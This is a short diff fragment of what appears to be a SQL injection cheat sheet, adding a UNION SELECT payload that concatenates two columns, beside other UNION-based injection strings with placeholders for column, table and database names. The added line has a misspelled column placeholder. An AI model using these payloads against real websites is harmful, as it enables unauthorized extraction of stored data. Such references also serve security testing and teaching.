@@ -73,6 +73,8 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 
 ' union select [column name here],null from [table name here]-- -
 
+' union select 1, column1 || colum2 from [database name here]-- -
+
 
 #Mysql Database info retrieving
 
